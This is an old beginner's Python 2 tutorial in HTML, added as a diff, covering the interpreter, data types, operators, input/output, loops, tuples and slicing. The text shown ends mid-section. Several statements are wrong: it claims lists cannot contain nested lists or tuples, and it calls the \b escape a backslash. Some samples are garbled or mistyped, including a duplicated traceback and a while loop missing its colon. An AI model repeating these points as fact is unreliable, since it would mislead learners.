@@ -1,0 +1,1130 @@
+
+<HTML><HEAD><TITLE>Python for Newbies</TITLE>
+<!--Style from http://blacksun.box.sk/tutorials.htm :)-->
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</STYLE>
+
+</HEAD>
+<BODY aLink=#ccff00 bgColor=#000000 link=#99ccff text=#cccccc 
+vLink=#cc99ff><FONT face="Verdana, Arial, Helvetica, sans-serif"><A name=top>
+<H1 align=center>Python for Newbies</H1></A>
+<H2 align=center>by <A href="mailto:skinite@home.com">Pupp3tM</A>, a.k.a. David 
+Borowitz</H2>
+<H3>Table of Contents</H3>
+<OL>
+  <LI><A 
+  href="#intro">Introduction</A> 
+
+  <OL type=a>
+    <LI><A 
+    href="#whatis">What 
+    is Python?</A> 
+    <LI><A 
+    href="#interp">The 
+    Interpreter</A> </LI></OL>
+  <LI><A 
+  href="#first">Your 
+  First Program</A> 
+  <OL type=a>
+    <LI><A 
+    href="#hello">Hello, 
+    World!</A> 
+    <LI><A 
+    href="#explain">Explanation</A> 
+    </LI></OL>
+  <LI><A 
+  href="#varmath">Variables 
+  and Math</A> 
+  <OL type=a>
+    <LI><A 
+    href="#var">Variables: 
+    Strings, Numbers, etc.</A> 
+    <LI><A 
+    href="#math">Math 
+    and Operators</A> </LI></OL>
+  <LI><A 
+  href="#io">Input/Output</A> 
+
+  <OL type=a>
+    <LI><A 
+    href="#print">Printing 
+    information</A> 
+    <LI><A 
+    href="#user">Interacting 
+    with the User</A> </LI></OL>
+  <LI><A 
+  href="#control">Program 
+  Control</A> 
+  <OL type=a>
+    <LI><A 
+    href="#if">What 
+    If...</A> 
+    <LI><A 
+    href="#for">For 
+    Ever...</A> 
+    <LI><A 
+    href="#while">While 
+    We...and Others</A> </LI></OL>
+  <LI><A 
+  href="#inter">Intermediate 
+  Python</A> 
+  <OL type=a>
+    <LI><A 
+    href="#tuples">Tuples!</A> 
+
+    <LI><A 
+    href="#string">Strings 
+    and Slice Indexing</A> 
+    <LI><A 
+    href="#fileio">File 
+    I/O</A> </LI></OL>
+  <LI><A 
+  href="#mod">Modules</A> 
+
+  <OL type=a>
+    <LI><A 
+    href="#mod1">Overview 
+    and Importing</A> 
+    <LI><A 
+    href="#builtin">Builtin 
+    Modules</A> 
+    <LI><A 
+    href="#yours">User-Defined 
+    Modules and Functions</A> </LI></OL>
+  <LI><A 
+  href="#close">In 
+  Closing</A> 
+  <OL type=a>
+    <LI><A 
+    href="#perl">Why 
+    Python is Better than Perl</A> 
+    <LI><A 
+    href="#ref">References</A> 
+    </LI></OL></LI></OL>
+<HR>
+
+<H2 align=center><A name=intro>Introduction</A></H2>
+<H3 align=center><A name=whatis>What is Python?</A></H3><BR>
+<P>Python is, in short, a scripting language. It is similar in function to Perl, 
+but to my knowledge is not nearly as popular. To fix that is part of the goal of 
+this tutorial. It is a very high-level language that can perform complex tasks, 
+but is surprisingly easy to learn. Many different add=ons (modules) are 
+available to control everything from MP3s to windowing toolkits (Unix). I find 
+Python to be a just plain <I>fun</I> language to program in, as it is very 
+intuitive and suited to a variety of uses. </P>
+<P>Python can be run on almost any platform, from 'nix to Windows. To get 
+Python, first go to <A href="http://www.python.org/">Python.org</A>, and then 
+download away! </P>
+<P>This tutorial is geared towards people who have little experience with 
+programming but know at least something. I make numerous references to languages 
+like C and Perl, which are good to know, but you won't lose much if you just 
+skip over them. </P>
+<P>What's with the funky name, you ask? Some sort of carnivorous reptile? No, 
+dear reader. Python's creators were (are) big Monty Python fans. The name comes 
+from the BBC show "Monty Python's Flying Circus," and in the official docs, it 
+says "Making references to Monty Python skits in documentation is not only 
+allowed, it is encouraged." That said, I'm afraid I haven't seen all too many 
+Monty Python movies so we'll go a little light on the references :) </P>
+<P>So sit back, grab a Coke, <A href="http://www.python.org/download/">download 
+Python</A>, and get ready to learn :) </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=interp>The Interpreter</A></H3><BR>
+<P>Python is a scripted, i.e. interpreted, language. Unlike C, which has a 
+compiler, we have in Python the...(drum roll please)...Python interpreter. Once 
+you have Python correctly installed, in your Unix shell or Dos box type 'python' 
+(Note: anytime I tell you to type something and put it in quotes, don't type the 
+quotes. I'm sure you already figured this out, but...). If you've used perl or 
+some other interpreted language before, you might notice something: there's a 
+prompt (those three little "&gt;&gt;&gt;" things)! Not waiting for stdin or 
+saying "Usage: python &lt;script-file&gt;"! That's right, Python has an 
+<I>interactive mode</I>. In this mode, you can type any Python command and it 
+will work just like you typed it from a script, with a few differences. Most 
+importantly, if you type a variable of some sort or something that returns a 
+value of some sort (except assignments), it will print the result automatically. 
+Neat for trying stuff out (and learning!). Now type '1 + 1' at the prompt you 
+should still be at. What do you see? 2! Now ain't that a powerful language: <PRE>&gt;&gt;&gt; 1 + 1
+2
+</PRE>You can do this with any kind of variable or math expression (see part <A 
+href="#math">3b</A>) 
+and get some output. Works with strings too: <PRE>&gt;&gt;&gt; "elp! I'm being oppressed"
+"elp! I'm being oppressed"
+</PRE>Note the bad Monty Python reference :). Anyway, that's all for the 
+interpreter. Now we get into the meat of things. If at any point there's a 
+sample script and you don't feel like creating a new file for it, feel free to 
+type (or better yet copy &amp; paste) it into the interpreter, it should work 
+the same. Wait, scratch that :). If I put something in a script, it most likely 
+means you only get the effect from a script and it won't work in interactive 
+mode. Sorry. 
+<P></P>
+<P>Wait! One note before we leave. To quit the interpreter, you can't do 
+anything fancy like type 'quit'. For some reason (beats me), that doesn't work. 
+You have to type Ctrl+D to quit (on Unix at least, haven't tested it on 
+Windows). Anyway if you type 'quit' it'll say something like 'Use Ctrl-D (i.e. 
+EOF) to exit.' so listen to that. </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=first>Your First Program</A></H2>
+<H3 align=center><A name=hello>Hello, World!</A></H3><BR>Alright, if you've ever 
+read a programming tutorial before you know they all have some sort of program 
+that just prints "Hello, World!" or something on the screen. Unfortunately, this 
+tutorial is no different. Alright, here goes: <PRE>#!/usr/bin/python
+#You only need the above line for Unix; replace that with your path to python
+
+hello = "Hello, World!"
+print hello
+</PRE>That's it! Put that in a text file, name it hello.py, run it, and we're 
+good. On Unix you may have to 'chmod +x hello.py' to run it, or just type 
+'python hello.py'. Windows, I'm pretty sure .py files are associated with the 
+Python interpreter automatically. 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=explain>Explanation</A></H3><BR>"Wow," you may be 
+saying, "that was easy." Indeed it was. Now, though, you probably only have some 
+remote clue of what's going on. We'll take it line by line. <PRE>#!/usr/bin/python
+</PRE>This line, like you should've read, is only needed for Unix users. It 
+tells your shell where the python executable is so it can run the script. <PRE>#You only need the above line for Unix; replace that with your path to python
+</PRE>A pretty useless line, you may think, but it illustrates an important 
+point: comments! Any good programmer knows that you need comments in your code, 
+so just put # and anything after that on that line is a comment and will be 
+ignored by the interpreter. <PRE>hello = "Hello, World!"
+</PRE>I didn't really need this line, but I thought a Hello, World! script with 
+only one line is kinda lame, so I added it anyway. hello is a string variable, 
+which we'll talk about later, and the = operator assigns "Hello, World!" as its 
+value. I'm sure if you've programmed before you've seen all this. <PRE>print hello
+</PRE>This last line, as you may well guess, prints the contents of hello. If 
+you're a perl guy (or girl :), you need to know that if you're printing a 
+variable you can't put the name of the variable in quotes. But that's not too 
+inconvenient, as we should see later. 
+<P></P>
+<P>Alright! Our first program! Now just a note or two before we move on. First, 
+you may notice that there's nothing on the end of any lines, no ; like in perl 
+or C. That's one of the convenient features of Python. I think it's more 
+intuitive because blocks (later dammit!) are determined by indenting and every 
+statement has its own line...you may disagree I guess but you'll just have to 
+get used to it. </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=varmath>Variables and Math</A></H2>
+<H3 align=center><A name=var>Variables: Strings, Numbers, etc.</A></H3><BR>In 
+Python, just like any other language worth its salt, there are a number of data 
+types, Mainly, there are numbers (of arbitrary precision), strings, lists, and 
+tuples. Tuples are more of an "advanced" variable type, kind of like lists, so I 
+won't go into them here, but I'll touch on them a bit in the <A 
+href="#inter">Intermediate 
+Python</A> section. 
+<P></P>
+<P>Numbers. What can I say? Numbers are numbers. To assign them, just like you 
+did with the string in Hello World!, just put the name of your variable, the = 
+operator, and what you want it to be: <PRE>&gt;&gt;&gt; a = 5
+&gt;&gt;&gt;
+</PRE>A word on variable names: I'm not quite sure exactly how long Python 
+allows them to be (should I know?), but as a general rule you shouldn't have 
+names more than 20 or so characters. Like other languages, variable names must 
+be all alphanumeric characters and underscores (_), but you <I>can</I> start 
+names with underscores, unlike some languages. 
+<P></P>
+<P>Anyway, on to strings. Strings store, obviously, strings of characters. 
+Nothing you haven't heard before. For strings, you can use either type of quotes 
+("" or ''), but be sure you know which kind. If you want to use, say, an 
+apostrophe inside a string, you need to make sure of some things. If the string 
+has "" quotes, don't worry about it, just put your apostraph. If you were in '' 
+quotes, though, you would need to escape the apostrophe. This is so the 
+interpreter doesn't think the apostrophe, which is just like a quote, is the end 
+of your string. To escape the apostrophe, just put a \ (backslash) in front of 
+the quote. Try it! It's great: <PRE>&gt;&gt;&gt; "I'm Dave"
+"I'm Dave"
+&gt;&gt;&gt; 'Python\'s my favorite language'
+"Python's my favorite language"
+&gt;&gt;&gt; "\"I can't think of anything else to say!\" he said"
+'"I can\'t think of anything else to say!" he said'
+&gt;&gt;&gt; 'That's too bad'
+      File "&lt;stdin&gt;", line 1
+    'That's too bad'
+          ^
+SyntaxError: invalid syntax
+</PRE>Note the last two examples. The first one illustrates escaping of the "" 
+quotes and also this: If you have both types of quotes in a string, Python will 
+default to one and escape the other. Don't worry; if you're printing this to the 
+screen it won't show the \ character in your output. In the last example, that's 
+what happens when you don't escape quotes. You may notice Python has a nice way 
+of handling errors, but we won't go into that. 
+<P></P>
+<P>Speaking of escaping, here are a few more characters you can escape (if it 
+says 'n' then you use '\n' to escape it): 
+<UL>
+  <LI>n - Prints a newline, i.e. starts a new line. 
+  <LI>t - Horizontal tab 
+  <LI>b - Backslash. Deletes the last character typed 
+  <LI>a - System beep 
+  <LI>\ - Prints a backslash 
+  <LI>r - Prints a carriage return. Use newline unless you know what you're 
+  doing. </LI></UL>Of course there are more, but you won't use them too often. 
+<P></P>
+<P>With strings, you can also concatenate them (stick them together) with the + 
+operator. If you have two literal strings (i.e. not functions that return a 
+string), you don't even need an operator: <PRE>&gt;&gt;&gt; 'holy' + 'grail'
+'holygrail'
+&gt;&gt;&gt; 'BS' 'RF'
+BSRF
+</PRE>Next come lists. Lists are called arrays in some languages, but it's all 
+the same (well, not quite...). A list is a bunch of values grouped together in 
+brackets []. Lists can contain any number of other variables, even strings and 
+numbers in the same list, but no tuples or nested lists. Assigning lists is 
+simple: <PRE>&gt;&gt;&gt; a = [1, "thin", "mint", 0]
+&gt;&gt;&gt; a
+[1, 'thin', 'mint', 0]
+</PRE>Lists can be accessed simply by name, but you can access any variable in a 
+list with its index by putting the index number in brackets right after the 
+name. Note that index numbering starts at 0: <PRE>&gt;&gt;&gt; a[0]
+1
+</PRE>You can also use negative index numbers to start counting from the end of 
+the list: <PRE>&gt;&gt;&gt; a[-1]
+0
+</PRE>That's all for indexes for now, but in the Intermediate string section we 
+get to learn about fun things like slice indexes to access more than one element 
+in a list. You can also use your masterful index-calling knowledge in strings. 
+Characters in a string act just like elements in a list: <PRE>&gt;&gt;&gt; a = "BSRF"
+&gt;&gt;&gt; a[1]
+S
+</PRE>Be warned though: You can replace individual elements in a list, but not 
+in a string: <PRE>&gt;&gt;&gt; a = [1, "thin", "mint", 0]
+&gt;&gt;&gt; b = "BSRF"
+&gt;&gt;&gt; a[3] = 4
+&gt;&gt;&gt; a
+[1, 'thin', 'mint', 4]
+&gt;&gt;&gt; b[1] = "M"
+Traceback (innermost last):
+  File "&lt;stdin&gt;Traceback (innermost last):
+  File "&lt;stdin&gt;", line 1, in ?
+TypeError: object doesn't support item assignment", line 1, in ?
+</PRE>
+<P></P>
+<P>That's all folks! For data types at least... </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=math>Math and Operators</A></H3><BR>
+<P>There are a few basic math operators in Python: +, -, *, /, **, and %. If you 
+went to any school at all you know what +, -, *, and / do. That leaves ** and %. 
+** is your exponentiatingneniating operator: <PRE>&gt;&gt;&gt; 2 ** 6
+64
+</PRE>Likewise % is your standard modulus operator. Modulus? Yeah. In case you 
+don't know, the % operator divides the first number by the second number and 
+gives the remainder. Observe: <PRE>&gt;&gt;&gt; 4 % 2
+0
+&gt;&gt;&gt; 10 % 3
+1
+&gt;&gt;&gt; 21 % 6
+3
+</PRE>You may have noticed in the course of trying out some of this stuff that 
+if you divide, say, 1 by 3, you get 0. This is because Python always rounds down 
+when working with integers. To work in floating-point numbers, just put a . 
+(decimal point) in your expression somewhere: <PRE>&gt;&gt;&gt; #Bad
+... 1/3
+0
+&gt;&gt;&gt; #Good
+... 1./3
+0.333333333333
+&gt;&gt;&gt; #Good also
+... 1/3.
+0.333333333333
+</PRE>In addition to your basic math operators, there are comparison operators 
+in Python as well (what did you expect?). In the a couple more sections we'll 
+learn how to use them in context, but here they are anyway: 
+<UL>
+  <LI>a == b checks if two a is equal to b (a and b can be any data type, not 
+  just numbers) 
+  <LI>a &gt; b checks if a is greater than b (see parentheses above) 
+  <LI>a &lt; b checks if a is less than b (etc.) 
+  <LI>a &gt;= b checks if a is greater than or equal to b 
+  <LI>a &lt;= b checks if a is less than or equal to b 
+  <LI>a != b checks if a isn't equal to b </LI></UL>You probably got nothing 
+useful out of that except that even things like strings and lists can be 
+compared. In fact, lists (or strings) don't even have to be of the same size to 
+be compared: <PRE>&gt;&gt;&gt; #A return value of 1 means true, 0 means false
+... [1, 2, 3, 4] &gt; [1, 2, 3]
+1
+&gt;&gt;&gt; [1, 2, 4] &gt; [1, 2, 3]
+1
+&gt;&gt;&gt; [1, 2, 3] &lt; [1, 3, 2]
+1
+&gt;&gt;&gt; [1, 2, -1] &gt; [1, 2]
+1
+</PRE>Also notice how list comparison is performed. The first values are 
+compared. If they're equal, the next values are compared. If those two are 
+equal, the next values are compared. This continues until the value in one is 
+not equal to the value in the other (if all are equal then the lists are equal). 
+Look at the third example: even though the 3rd value (index 2, remember) of the 
+first list (3) is greater than the third of the second (2), the second list is 
+still greater than the first because the interpreter never got that far; it 
+found that the second number in the second list (3) was greater than in the 
+first list (2), so it stopped (confused? That's Ok). If the interpreter gets to 
+a null value (i.e. there are no items left in the list), then the longer list is 
+greater (see 4th example above). 
+<P></P>
+<P>Last thing on operators: logical operators. and, or, not (there's no xor, 
+unlike perl). and returns the last value encountered if true, 0 if false. or is 
+the same, but it's true if only one of the arguments is non-zero (or non-null 
+for strings). Finally, not returns 1 if the single argument is zero (null) or 0 
+if the argument is non-zero. Observe: <PRE>&gt;&gt;&gt; 1 and 4
+4
+&gt;&gt;&gt; 2 or 0
+2
+&gt;&gt;&gt; 'monty' and 'python'
+'python'
+&gt;&gt;&gt; not 0
+1
+&gt;&gt;&gt; not ''
+1
+</PRE>
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=io>Input/Output</A></H2>
+<H3 align=center><A name=print>Printing information</A></H3>In our Hello, World! 
+example above, we already saw one way of printing output, namely the 
+(self-explanatory) print statement. print works pretty much like it does in 
+perl, printing a string or any sort of variable or expression out on the screen. 
+Anything you enter with print automatically has a newline, "\n", appended to it. 
+<PRE>&gt;&gt;&gt; print "She's a witch!"
+She's a witch!
+&gt;&gt;&gt; print 5 + 3
+8
+&gt;&gt;&gt; a = "Burn her!"
+&gt;&gt;&gt; print a
+Burn her!
+<A name=slice></A>&gt;&gt;&gt; #Don't worry if you don't know what this does; it's covered in the Intermediate section
+... print "Yeah, b" + a[1:]
+Yeah, burn her!
+</PRE>If you don't want a newline appended, as is sometimes the case, simply add 
+a ',' to the end of the line with your print statement. Note that this only 
+works in non-interactive mode, so you need to make a new file.py or something. 
+Try this on for size: <PRE>#!/usr/bin/python
+a = 5
+print "The value of a is",
+print a,
+print "!"
+</PRE>Output: <PRE>The value of a is 5 !
+</PRE>There's a few more ways you can put (non-string) variables in a print 
+statement. You can use a comma, which will put a space around the variable. The 
+final main way is to convert your variable to a string first, which is done 
+simply by putting it in some backwards quotes (``). Then just append this to 
+your string like you would any other string variable or value (see above). Check 
+out these examples: <PRE>&gt;&gt;&gt; a=5
+&gt;&gt;&gt; #Note the spacing around the number
+... print "A duck costs $", a, "."
+A duck costs $ 5 .
+&gt;&gt;&gt; #Same thing, different way of putting it in
+... print "A duck costs $" + `a` + "."
+A duck costs $5.
+</PRE>For those of you who know what stderr is (or stdout and stdin for that 
+matter), yes, you can access it directly in Python. This does however use a bit 
+more of an advanced technique, so to really understand what's going on here you 
+should read <A 
+href="#fileio">File 
+I/O</A> and <A 
+href="#mod">Modules</A>. 
+Anyway, try out this script: <PRE>#!/usr/bin/python
+
+import sys #Didn't I tell you to read about modules?
+sys.stderr.write( "This is some error text\n" ) #You do need a \n here since
+#you're writing directly to the file descriptor (READ FILE I/O)
+</PRE>Run it, it looks more or less normal, just prints "This is some error 
+text". Now try running it as "python test.py &gt; /dev/null" (Unix) or "test.py 
+&gt; nul" (Dos/Win). What's this? The output is still there, even though you 
+redirected it to /dev/null or nul, the wastebasket of output. Instead of writing 
+to the standard output (stdout), which is what print does, here you wrote to the 
+standard error (stderr), which is separate from stdout (even though they appear 
+on the same screen) and informs you of any errors your program might encounter. 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=user>Interacting with the User</H3>
+<P>Alright, I admit it, this title is a bit too broad. In this section I'm just 
+covering how to input variables from the user, not like catching keypresses or 
+anything. Anyway, inputting from the, er, standard input is done with two simple 
+functions in Python: input and raw_input. I'll discuss raw_input first 'cause 
+it's simpler to use. </P>
+<P>raw_input takes one argument, which is the prompt that'll come up while it 
+waits for the user to type something. It returns the string that is typed, so it 
+is most useful in assignments. A simple example: <PRE>&gt;&gt;&gt; a = raw_input( "Type something: " )
+Type something: Dave
+&gt;&gt;&gt; a
+'Dave'
+</PRE>Don't be too confused. I typed in 'Dave', and raw_input assigned it to the 
+variable a. "That's all well and good," you say, "but what if I don't want to 
+input a string? What if I want a number or list?" Well, there are really about 3 
+ways. First and simplest is the input function, which you'll see if you just 
+scroll down a bit. Another is string.atoi, which although a bit more advanced, 
+adds some flexibility to the input process, although it only changes strings to 
+ints (Subliminal message: <A 
+href="#mod">Modules</A>). 
+I won't go into too much detail, but here's a simple example of atoi: <PRE>&gt;&gt;&gt; from string import atoi
+&gt;&gt;&gt; a = "5"
+&gt;&gt;&gt; a
+'5'
+&gt;&gt;&gt; a = atoi(a)
+&gt;&gt;&gt; a
+5
+&gt;&gt;&gt; #If you have Python 2.0 or higher, just do this
+... a = "5"
+&gt;&gt;&gt; a = int(a)
+&gt;&gt;&gt; a
+5
+</PRE>Wow, a was converted from '5' to 5. Now let's move on. If you want to 
+input any type of variable at all, like I said before, you want to use input. 
+Input works just like raw_input, except Python interprets the variables as 
+whatever is typed in. If that didn't make much sense, think of it this way: If 
+you have a straight-up number, it's stored as a number. If you have some values 
+in [] brackets, it's stored as a list. You can even put something in quotes to 
+have a string. Check it out: <PRE>&gt;&gt;&gt; a = input( "Enter something: " )
+Enter something: 5
+&gt;&gt;&gt; a
+5
+&gt;&gt;&gt; a = input( "Enter something: " )
+Enter something: [3, 6, 'Hello']
+&gt;&gt;&gt; a
+[3, 6, 'Hello']
+&gt;&gt;&gt; a = input( "Enter something: " )
+Enter something: Hello
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in ?
+  File "&lt;string&gt;", line 0, in ?
+NameError: There is no variable named 'Hello'
+</PRE>Uh oh! What happened there? Well, the one pitfall of input is that it 
+looks at everything as some sort of variable; it thought Hello was the name of a 
+variable, so it screwed up when it found out there was no Hello. There are a few 
+ways to get around this, like exception catching, but that's beyond the scope of 
+this tutorial. For now, you'll have to trust your user to input the type of 
+variable you want (I know, I know, you usually shouldn't trust your users, 
+but...). Onward, onward. 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=control>Program Control</A></H2>
+<H3 align=center><A name=if>What If...</A></H3>
+<P>If you've <I>ever</I> programmed before, in something from Basic to Flash, 
+you've seen if blocks. Hell, I don't even know why I devoted a whole section to 
+them, since all I have to do is show you the structure, right? Alright, remember 
+those comparison operators you used before? Good. Take a gander at this example 
+code: <PRE>&gt;&gt;&gt; name = raw_input( "What's your name? " )
+What's your name? David
+&gt;&gt;&gt; if name &lt; "Dave":
+...     print "Your name comes before mine." #That's a tab there
+... elif name &gt; "Dave":
+...     print "Your name comes after mine."
+... else:
+...     print "Hey, we have the same name!"
+...
+Your name comes after mine.
+</PRE>Lame example, I know, but it gets the point across. Get over it. Now here 
+you might notice a few things different than other languages you know (you might 
+not, what can I say). We'll try to keep it in some sort of order too. First, you 
+see the if, then a conditional statement. The conditional statement is just like 
+we saw earlier, one expression and an operator and another expression. You could 
+also just have an expression, and if'll see it as true if the expression 
+evaluates to non-zero. But anyway. Next comes a colon, then a newline. You need 
+this newline. On the next line or two or three or however many, the code is 
+indented. One space, four spaces, eight spaces, it doesn't matter, it just has 
+to be indented. Depending on how messy you generally code, this may be a 
+convenient, code=beautifying feature or the code block from hell. I personally 
+like it. The next line has a cryptic-looking statement elif. First notice it's 
+not indented; it's not in the same code block. elif is not life backwards, it's 
+short for else if. If the first condition isn't true, it checks the next one. 
+Next block, there we go. Finally comes else: the fallback statement, in case 
+none of the above conditions (there can be as many as you want, which serves as 
+a replacement for C-style switch statements) are met. 
+<P></P>
+<P>There it is, if in a nutshell. </P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=for>For Ever...</A></H3>
+<P>Wow, don't I come up with the worst section titles? Anyway, on to the next 
+standard loop: the for loop. Python's for loop is probably a bit different from 
+those you've seen, unless you've seen perl's or PHP's foreach loop. for loops in 
+Python run through each item in a string or list and assign it to a particular, 
+specified variable. The syntax is intuitive and might even resemble human 
+speech. Watch and learn: <PRE>&gt;&gt;&gt; for letter in "Brian": #Blocks are treated the same way as above
+...     print letter
+...     #This just prints each letter in "Brian" on its own line
+...
+B
+r
+i
+a
+n
+</PRE>Very simple. But you might say this odd for loop is lacking because it 
+doesn't go through, for example, the numbers from 1 to 10 and put them in i, 
+like in *other* languages. That is easily overcome with the ubiquitously useful 
+range() function. range() will return a list, perfect for running through with 
+for, of numbers in a specified range (now where do those Python creators come up 
+with those names?). You can specify one of a number of arguments, as follows: <PRE>&gt;&gt;&gt; #This returns a list of 6 numbers, starting at 0
+... range(6) #which means the argument you put there is not actually in the list.
+[0, 1, 2, 3, 4, 5]
+&gt;&gt;&gt; #A list from 6 to 10-1, or 6-9.
+... range(6,10) Remember 10 doesn't actually appear, just like above.
+[6, 7, 8, 9]
+&gt;&gt;&gt; range(6,10,2) #Same as above, only increments by 2.
+[6, 8]
+&gt;&gt;&gt; range(10,6,-1) #Negative increments work too. The last number, 6, still doesn't appear.
+[10, 9, 8, 7]
+</PRE>Those should have been pretty much self-explanatory. Another little trick, 
+if you want to iterate through the elements in a list by index number, is to use 
+the len() function (which returns the length of the list) together with the 
+range() function: <PRE>&gt;&gt;&gt; l = ["I'm", "not", "dead"]
+&gt;&gt;&gt; for i in range(len(l)):
+...     print "Item", i, "of l is "+l[i]
+...
+Item 0 of l is I'm
+Item 1 of l is not
+Item 2 of l is dead
+</PRE>Well, that about wraps it up for for loops. Remember: if you can't come to 
+grips with for really being a foreach, range() is your friend. 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=while>While We...and Others</A></H3>
+<P>I'm not even going to <I>say</I> anything about this title. Moving on, then, 
+to the last of the ever-so-common loops: while. while performs its little block 
+of code forever and ever, or at least until some predefined condition is met. <PRE>&gt;&gt;&gt; while name != "Dave"
+...     name = raw_input( "What's my name? " )
+...
+What's my name? David
+What's my name? Monty
+What's my name? Dave
+&gt;&gt;&gt;
+</PRE>Notice how it obstinately refuses to let me go on until I give it what 
+it's looking for. Of course, while loops need not be dependent on user input. 
+This loop here will calculate every cube that's under 1000: <PRE>&gt;&gt;&gt; c = 0
+&gt;&gt;&gt; while c**3 &lt;= 1000:
+...     print `c`+"^3="+`c**3`
+...     c = c + 1
+...
+0^3=0
+1^3=1
+2^3=8
+3^3=27
+4^3=64
+5^3=125
+6^3=216
+7^3=343
+8^3=512
+9^3=729
+10^3=1000
+</PRE>A few other features of loops bear mentioning: break, continue, and else. 
+break will completely break out of a loop, bypassing any statements (and else 
+clauses, as we shall see). continue will stop where it is in the loop and go on 
+with the next iteration. else clauses, which can be used on any loop (not just 
+if), specify code to execute after the loop is finished, e.g. in a for loop 
+there are no more items to iterate through. Look at this 
+slightly-modified-but-still-cheesy example: <PRE>&gt;&gt;&gt; for i in range(3):
+...     name = raw_input( "What's my name? " )
+...     if name != "Dave":
+...             print "Wrong!"
+...             continue
+...     else:
+...             print "Damn straight!"
+...             break
+... else:
+...             print "Too many guesses! You're wrong!"
+...
+What's my name? David
+Wrong!
+What's my name? David
+Wrong!
+What's my name? David
+Wrong!
+Too many guesses! You're wrong!
+&gt;&gt;&gt; #Try it again, but I won't type the code here again
+What's my name? Dave
+Damn straight!
+</PRE>Well, so much for control structures... 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H2 align=center><A name=inter>Intermediate Python</A></H2>
+<H3 align=center><A name=tuples>Tuples!</A></H3>
+<P>Well, here we are, at the much-hyped tuple section. Tuples are another type 
+of variable that resemble lists but are more general and have a wider range of 
+features. They are usually put in parentheses (), but sometimes parentheses 
+aren't even necessary to assign them: <PRE>&gt;&gt;&gt; t = (1, 2, 3) #Wow, our first tuple :)
+&gt;&gt;&gt; t
+(1, 2, 3)
+&gt;&gt;&gt; t + 1, 2, 3 #Who needs parentheses? Well most of the time you do...
+&gt;&gt;&gt; t
+(1, 2, 3)
+&gt;&gt;&gt; t[0] #Still use brackets to get indexes
+1
+&gt;&gt;&gt; t = 1, #You need the trailing comma, or else t is just an int
+(1)
+</PRE>Great, you say, but what makes these "tuples" more special than any old 
+lists? Well, for one thing, tuples can be nested in one another: <PRE>&gt;&gt;&gt; tu = tuple(range(1,4)) #Note use of tuple function
+&gt;&gt;&gt; ple = tuple(range(4,7))
+&gt;&gt;&gt; tuples = tu, ple
+&gt;&gt;&gt; tuples
+((1, 2, 3), (4, 5, 6))
+&gt;&gt;&gt; print tuples[1][1] #Access it like this
+5
+</PRE>Nesting tuples together like this can provide a substitute for things like 
+two-dimensional arrays (arrays of arrays) in C without all that pesky pointing. 
+Also notice, just for convenience, the tuple() function. This just converts any 
+old list into any old tuple. Its opposite, the list() function, also exists. 
+There's another little nifty feature of tuples that bears talking about: packing 
+and unpacking. Packing a tuple is basically what we've seen above, putting two 
+or more variables in a tuple just with commas. Unpacking can also be useful. Try 
+to see how this works: <PRE>&gt;&gt;&gt; n = tuple(range(1,6))
+&gt;&gt;&gt; a1, a2, a3, a4, a5 = n
+&gt;&gt;&gt; print a1, a2, a3, a4, a5
+1 2 3 4 5
+</PRE>In case you didn't quite understand that, what the second line did was 
+take each member of the tuple n and assign it to a different variable, a1 
+through a5. This unpacking, just so you know, also works with lists. Just put 
+the list of variables in list brackets []. Note how these two examples do the 
+same thing: <PRE>&gt;&gt;&gt; l = range(1,4)
+&gt;&gt;&gt; [l1, l2, l3] = l
+&gt;&gt;&gt; t1, t2, t3 = tuple(l)
+&gt;&gt;&gt; print l1, l2, l3, "\n", t1, t2, t3
+1 2 3
+1 2 3
+</PRE>When you're unpacking a bunch of tuples, just remember that the number of 
+variables in your list has to equal the length of the tuple. There is one more 
+interesting opportunity afforded by tuple packing and unpacking, namely multiple 
+assignment. It may seem like this has nothing whatsoever to do with tuples, but 
+look now, I'll explain later: <PRE>&gt;&gt;&gt; a, b = 0, 1
+&gt;&gt;&gt; a
+0
+&gt;&gt;&gt; b
+1
+</PRE>Look at that, a and b assigned different values in the same line! Very 
+useful, very simple. Now, since this is the <I>Intermediate</I> section, an 
+explanation (rather simple though) is in order. First look on the right: the 
+values 0 and 1 are packed into a "temporary" tuple. which I'll call t but I'm 
+not sure really has a name. Now on the left. a and b, since they are a 
+comma-separated sequence, are about to receive an unpacked tuple. This tuple is 
+t. Just like normal unpacking, the first element of t goes in a and the second 
+in b. Voila! There's your multiple assignment. 
+<P></P>
+<P><FONT size=-2><A 
+href="#top">Back 
+to top</A></FONT></P>
+<HR>
+
+<H3 align=center><A name=string>Strings and Slice Indexing</A></H3>
+<P>Remember waaayyy back up <A 
+href="#slice">somewhere</A> 
+where I had a string indexed like a[1:]? Well, that's a simple example of slice 
+indexing. With slice indexing you can take more than just one element of a 
+string (or list or tuple, but it's usually more useful with strings), in fact 
+you can take a whole slice out of it (hence the name). Just put two numbers, the 
+starting and ending indices, inside your brackets. Observe: <PRE>&gt;&gt;&gt; s = 'supercalifragalisticexpialidotious'
+&gt;&gt;&gt; s[0:5]
+'super'
